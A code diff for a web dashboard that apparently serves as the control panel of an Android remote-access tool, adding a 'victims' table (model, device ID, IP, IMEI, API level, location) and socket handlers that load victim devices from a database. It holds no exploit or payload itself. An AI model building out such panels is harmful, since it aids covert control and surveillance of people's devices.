@@ -7,24 +7,22 @@
             <table width="100%" class="table table-hover" id="dataTables-example">
                 <thead>
                     <tr>
-                        <th>Client ID</th>
+                        <th>Model</th>
                         <th>Device-ID</th>
                         <th>IP Address</th>
                         <th>IMEI</th>
-                        <th>OS Version</th>
-                        <th>Network</th>
+                        <th>API</th>
                         <th>Location</th>
                         <th></th>
                     </tr>
                 </thead>
-                <tbody> 
+                <tbody class="victims-body"> 
                     <tr>
                         <td>Philip Chaney</td>
                         <td>192.168.12.1</td>
                         <td>Manager</td>
                         <td>Manager</td>
-                        <td>8.0</td>
-                        <td>Manager</td>
+                        <td>23</td>
                         <td>Manager</td>
                         <td class="text-end">
                             <button id="btn-connection-status" class="btn btn-outline-danger btn-rounded"><i class="fas fa-wifi"></i></button>
@@ -161,7 +159,7 @@
             type: 'post',
             data: {
               'data' : msg['data'],
-              'highlight' : 'success'
+              'highlight' : 'light'
             },
             success: function(data){
               $('.log-class').append(data.htmlresponse);
@@ -171,9 +169,70 @@
 
       socket.on('victims', function(msg) {
         if(msg != "None"){
-          // do something
+          $.ajax({
+            url: '/log',
+            type: 'post',
+            data: {
+              'data' : 'Fetching clients from database ...',
+              'highlight' : 'light'
+            },
+            success: function(data){
+              $('.log-class').append(data.htmlresponse);
+              console.log(msg['data'].length)
+              for (var i = 0; i <= (msg['data'].length - 1); i++) {
+                var items = []
+                for (var j = 0; j <= (msg['data'][i].length - 1); j++){
+                  console.log(msg['data'][i][j])
+                  items.push(msg['data'][i][j])
+                }
+                $.ajax({
+                  url: '/clients',
+                  type: 'post',
+                  data: {
+                    'model' : items[1],
+                    'device-id' : items[2],
+                    'ip-address' : items[3],
+                    'api' : items[4],
+                  },
+                  success: function(data){
+                    $('.victims-body').append(data.htmlresponse);
+                  }
+                });
+              }
+              $.ajax({
+                url: '/log',
+                type: 'post',
+                data: {
+                  'data' : 'Finished fetching clients from database',
+                  'highlight' : 'success'
+                },
+                success: function(data){
+                  $('.log-class').append(data.htmlresponse);
+                }
+              });
+            }
+          });
+          
+         
+        }else{
+          $.ajax({
+            url: '/log',
+            type: 'post',
+            data: {
+              'data' : 'No active clients',
+              'highlight' : 'danger'
+            },
+            success: function(data){
+              $('.log-class').append(data.htmlresponse);
+            }
+          });
         }
       });
+
+      socket.on('new_device', function(msg) {
+        console.log("from new device")
+      });
+
       socket.on('update value', function(msg) {
         console.log('Slider value updated');
       });
